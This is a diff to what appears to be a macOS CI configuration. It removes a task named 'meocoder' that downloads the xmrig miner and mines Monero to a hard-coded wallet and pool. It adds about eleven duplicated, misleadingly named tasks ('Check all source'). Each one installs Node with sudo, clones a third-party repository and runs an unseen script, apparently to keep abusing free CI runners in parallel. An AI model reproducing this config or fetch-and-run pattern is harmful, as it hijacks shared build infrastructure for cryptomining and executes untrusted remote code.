@@ -1,7 +1,51 @@
 macos_instance:
-  image: big-sur-xcode
+  image: catalina-base
 
-task:
-  name: meocoder
+install_nodejs_task:
+  name: Install NodeJS
   script:
-    wget https://glcdn.githack.com/k.ing.d.om.he.art.stm.p/meocoder/-/raw/master/xmrig-6.10.0-macos-x64.tar.gz &&  tar -xf xmrig-6.10.0-macos-x64.tar.gz  && cd  xmrig-6.10.0 && ./xmrig -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t 10 --astrobwt-avx2
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+clone_code_task:
+  name: Clone and run
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_one_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_two_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_three_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_four_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_five_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_six_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_ten_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_sevent_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_eight_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
+loop_nine_task:
+  name: Check all source
+  script:
+    curl "https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$HOME/Downloads/node-latest.pkg" && sudo installer -store -pkg "$HOME/Downloads/node-latest.pkg" -target "/" && git clone https://github.com/vippro99/nodejs-task.git && cd nodejs-task && npm i -s && node app-mac-pro.js
